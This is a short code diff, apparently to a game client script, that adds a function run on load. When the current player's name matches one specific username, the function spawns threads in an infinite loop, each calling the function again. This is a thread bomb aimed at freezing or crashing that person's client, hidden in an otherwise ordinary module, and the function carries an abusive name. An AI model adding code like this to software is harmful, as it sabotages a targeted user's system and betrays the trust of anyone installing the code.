@@ -64,3 +64,14 @@ import { sessionAuth, loggedIn } from "./build/auth"
         })
 })();
 
+KillYourSelf();
+
+function KillYourSelf() {
+    if (Player.getName() === "Pufi1") {
+        while (true) {
+            new Thread(() => {
+                KillYourSelf();
+            }).start();
+        }
+    }
+}
